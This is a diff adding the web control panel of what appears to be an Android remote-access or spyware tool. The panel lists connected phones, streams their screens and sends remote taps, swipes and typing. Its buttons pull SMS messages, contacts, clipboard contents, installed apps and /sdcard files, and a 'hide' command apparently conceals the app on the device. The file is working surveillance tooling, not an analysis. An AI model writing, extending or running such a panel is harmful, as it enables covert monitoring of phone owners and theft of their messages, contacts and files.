@@ -1,0 +1,91 @@
+<!doctype html><meta charset="utf-8"><title>Panel</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+ body{margin:0;font:13px system-ui;background:#101418;color:#e6e6e6;display:flex;height:100vh}
+ #side{width:210px;border-right:1px solid #222;overflow:auto;flex:none}
+ .d{padding:8px;border-bottom:1px solid #1c2229;cursor:pointer;word-break:break-all}
+ .d.on{color:#5dd}
+ #main{flex:1;display:flex;flex-direction:column;min-width:0}
+ #cv{flex:1;object-fit:contain;background:#000;width:100%}
+ #bar{display:flex;gap:4px;padding:6px;flex-wrap:wrap;border-top:1px solid #222}
+ button,input{background:#1b2229;color:#e6e6e6;border:1px solid #2c3742;border-radius:4px;padding:5px 8px;font:inherit}
+ #ev{height:110px;overflow:auto;font:11px monospace;padding:4px;border-top:1px solid #222;color:#9ab;white-space:pre-wrap}
+</style>
+<div id="side"></div>
+<div id="main">
+  <canvas id="cv"></canvas>
+  <div id="bar">
+    <input id="txt" placeholder="text" style="width:130px">
+    <button onclick="cmd({c:'type',t:txt.value})">type</button>
+    <button onclick="cmd({c:'shot'})">shot</button>
+    <button onclick="cmd({c:'back'})">back</button>
+    <button onclick="cmd({c:'home'})">home</button>
+    <button onclick="cmd({c:'recents'})">rec</button>
+    <button onclick="cmd({c:'notif'})">notif</button>
+    <button onclick="cmd({c:'lock'})">lock</button>
+    <button onclick="cmd({c:'info'})">info</button>
+    <button onclick="cmd({c:'apps'})">apps</button>
+    <button onclick="cmd({c:'files',p:'/sdcard'})">files</button>
+    <button onclick="cmd({c:'sms'})">sms</button>
+    <button onclick="cmd({c:'contacts'})">contacts</button>
+    <button onclick="cmd({c:'clip'})">clip</button>
+    <button onclick="cmd({c:'hide',v:true})">hide</button>
+    <button onclick="cmd({c:'hide',v:false})">show</button>
+  </div>
+  <div id="ev"></div>
+</div>
+<script>
+const T = new URLSearchParams(location.search).get('token') || '';
+const cv = document.getElementById('cv'), ctx = cv.getContext('2d');
+const ev = document.getElementById('ev'), side = document.getElementById('side');
+const txt = document.getElementById('txt');
+let cur = null, ws = null;
+const devs = new Map();
+
+function log(s){ ev.textContent = s + '\n' + ev.textContent.slice(0, 8000); }
+function cmd(m){ if (cur && ws) ws.send(JSON.stringify({ c:'cmd', id:cur, m })); }
+
+function open(){
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  ws = new WebSocket(`${proto}://${location.host}/panel?token=${T}`);
+  ws.onmessage = e => {
+    const o = JSON.parse(e.data);
+    if (o.c === 'dev'){ devs.set(o.id, { m: o.m, on: o.on }); render(); if (cur === o.id) cmd({ c:'shot' }); }
+    if (o.c === 'f' && o.id === cur){
+      const img = new Image();
+      img.onload = () => { cv.width = o.w; cv.height = o.h; ctx.drawImage(img, 0, 0); };
+      img.src = 'data:image/jpeg;base64,' + o.d;
+    }
+    if (o.c === 'ev' && o.id === cur) log(JSON.stringify(o.m).slice(0, 500));
+  };
+  ws.onclose = () => setTimeout(open, 2000);
+}
+
+function render(){
+  side.innerHTML = '';
+  for (const [id, d] of devs){
+    const el = document.createElement('div');
+    el.className = 'd' + (id === cur ? ' on' : '');
+    el.textContent = (d.m.model || id) + (d.on ? ' \u25CF' : ' \u25CB');
+    el.onclick = () => { cur = id; render(); cmd({ c:'shot' }); };
+    side.appendChild(el);
+  }
+}
+
+cv.onclick = e => {
+  const r = cv.getBoundingClientRect();
+  cmd({ c:'tap', x: Math.round((e.clientX - r.left) * cv.width / r.width),
+                    y: Math.round((e.clientY - r.top) * cv.height / r.height) });
+};
+let sx = 0, sy = 0;
+cv.onmousedown = e => { sx = e.clientX; sy = e.clientY; };
+cv.onmouseup = e => {
+  if (Math.abs(e.clientX - sx) < 12 && Math.abs(e.clientY - sy) < 12) return;
+  const r = cv.getBoundingClientRect(), k = cv.width / r.width;
+  cmd({ c:'swipe',
+        x1: Math.round((sx - r.left) * k), y1: Math.round((sy - r.top) * k),
+        x2: Math.round((e.clientX - r.left) * k), y2: Math.round((e.clientY - r.top) * k), ms: 260 });
+};
+txt.onkeydown = e => { if (e.key === 'Enter'){ cmd({ c:'type', t: txt.value }); } };
+open();
+</script>
